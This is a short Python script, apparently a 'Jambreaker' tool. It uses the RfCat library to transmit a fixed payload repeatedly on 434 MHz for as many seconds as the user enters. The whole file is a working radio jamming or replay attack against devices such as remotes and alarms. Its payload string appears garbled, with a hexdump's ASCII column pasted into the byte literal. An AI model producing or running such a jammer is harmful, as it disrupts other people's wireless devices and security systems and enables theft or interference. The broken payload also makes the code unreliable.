 from rflib import *
import time
import sys
from threading import Thread

d = RfCat()
d.setFreq(434000000)
d.setMdmDRate(2500)

def initialize():	
	for i in range(1,3):
		b = 'initialize Jambreaker ' + '.' * i
		print(b, end="\r")
		time.sleep(1)

def timer():
	start = time.perf_counter()
	d.RFxmit(b"ffffffdffffffffffddfcffbfb7dfbffdfeffffffffbffffbffffffaf6ffdf7fffff7f7fffffffdefd7ffff7dfbfff6febffffffbf77ff7fffefdffdff7ffff7afeeefffff7efff7ffbfffcfdbffdefff77fbf7efe7efefeffefdfffffeffffedfffffdbfffeedbfffbff7dffffdaf7fffff1440094987400081980000001000000000000000000000000000000000000000000000800000000000400000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010e401000000000000000100000080041000001200a01000400000  | .............}.................................o.....w...............~.............~.~.............................@.I.@...................................@..........@................................................................................@..")
	end = time.perf_counter()
	return start, end

def set_repeatment(timer):
	start = timer[0]
	print(start)
	end = timer[1]
	print(end)

	transmission_time = end - start
	jb_time = int(input("How long should it Jam Break (seconds): "))
	repeatment = jb_time / int(transmission_time)
	return repeatment




def transmitting(repeatment):
	print("starting")
	for i in range(0,int(repeatment)):
		d.RFxmit(b"ffffffdffffffffffddfcffbfb7dfbffdfeffffffffbffffbffffffaf6ffdf7fffff7f7fffffffdefd7ffff7dfbfff6febffffffbf77ff7fffefdffdff7ffff7afeeefffff7efff7ffbfffcfdbffdefff77fbf7efe7efefeffefdfffffeffffedfffffdbfffeedbfffbff7dffffdaf7fffff1440094987400081980000001000000000000000000000000000000000000000000000800000000000400000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010e401000000000000000100000080041000001200a01000400000  | .............}.................................o.....w...............~.............~.~.............................@.I.@...................................@..........@................................................................................@..")
		time.sleep(0.025)
		print('Transmission', i,'complete')
	print('finished')

if __name__ == '__main__':
	Thread(target=initialize).start()
	Thread(target=timer).start()

	transmitting(set_repeatment(timer()))
